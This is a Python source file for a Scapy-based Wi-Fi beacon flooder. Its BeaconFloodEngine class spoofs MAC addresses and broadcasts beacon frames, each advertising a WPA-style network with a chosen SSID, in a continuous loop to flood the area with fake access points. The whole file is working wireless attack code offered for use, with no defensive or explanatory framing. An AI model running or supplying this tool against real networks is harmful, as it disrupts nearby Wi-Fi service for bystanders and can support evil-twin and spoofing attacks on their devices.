"""Native Beacon Flooder using Scapy.

Broadcasts hundreds of fake Access Points with customizable SSIDs to clutter
the Wi-Fi environment.
"""
from __future__ import annotations

import random
import threading
import time
from typing import List

from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp


class BeaconFloodEngine:
    def __init__(self, iface: str, ssids: List[str]) -> None:
        self.iface = iface
        self.ssids = ssids
        self._stop = threading.Event()
        self._thread: threading.Thread | None = None

    def start(self) -> None:
        if self._thread and self._thread.is_alive():
            return
        self._stop.clear()
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=2)

    def _run(self) -> None:
        # Generate random MACs for each SSID
        targets = []
        for ssid in self.ssids:
            mac = "00:de:ad:be:ef:%02x" % random.randint(0, 255)
            targets.append((mac, ssid))

        print(f"[beacon_flood] starting flood on {self.iface} with {len(targets)} SSIDs")
        
        while not self._stop.is_set():
            for mac, ssid in targets:
                if self._stop.is_set():
                    break
                
                # Construct Beacon frame
                dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
                beacon = Dot11Beacon(cap="ESS+privacy")
                essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
                rsn = Dot11Elt(ID='RSNinfo', info=(
                    '\x01\x00'                 # RSN Version 1
                    '\x00\x0f\xac\x02'         # Group Cipher Suite: 00-0f-ac TKIP
                    '\x02\x00'                 # 2 Pairwise Cipher Suites
                    '\x00\x0f\xac\x04'         # AES (CCMP)
                    '\x00\x0f\xac\x02'         # TKIP
                    '\x01\x00'                 # 1 Authentication Key Management Suite
                    '\x00\x0f\xac\x02'         # Pre-Shared Key
                    '\x00\x00'                 # RSN Capabilities (no special options)
                ))
                
                packet = RadioTap() / dot11 / beacon / essid / rsn
                
                try:
                    sendp(packet, iface=self.iface, verbose=False)
                except Exception as e:
                    print(f"[beacon_flood] error: {e}")
                    self._stop.set()
                    break
            
            time.sleep(0.1)
